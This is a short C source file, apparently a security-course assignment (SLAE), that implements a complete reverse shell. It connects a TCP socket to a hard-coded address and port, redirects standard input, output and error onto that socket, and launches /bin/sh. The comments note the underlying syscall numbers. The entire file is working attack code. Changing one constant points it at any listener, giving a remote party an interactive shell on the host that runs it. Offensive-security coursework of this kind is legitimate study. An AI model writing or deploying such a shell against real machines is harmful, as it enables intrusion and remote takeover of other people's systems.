// File: reverse_shell.c
// Author: Dave Sully 
// Reverse shell in C, SLAE Assignment 2

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <unistd.h>


#define PORT 5555
#define IP "127.0.0.1" 

int main(int argc, char *argv[])
{
	// define and populate structure for socket 
	struct sockaddr_in addr;
	addr.sin_family = AF_INET; // 2
	addr.sin_addr.s_addr = inet_addr(IP); //127.0.0.1 
	addr.sin_port = htons(PORT); // 5555

	// Define and create socket 
	int s; 
	s = socket(AF_INET, SOCK_STREAM, 0) ; // Socket = syscall 359, AF_INET = 2, SOCK_STREAM = 1 
	connect(s, (struct sockaddr *)&addr, sizeof(addr)); // Connect syscall = 362 
	
	// Duplicate in, out and error 
	dup2(s, 0); // Dup2 sycall = 63 
	dup2(s, 1);
	dup2(s, 2); 
	
	// Execute Shell 
	execve("/bin/sh",0 ,0); // Execve syscall = 11
	return 0;

}
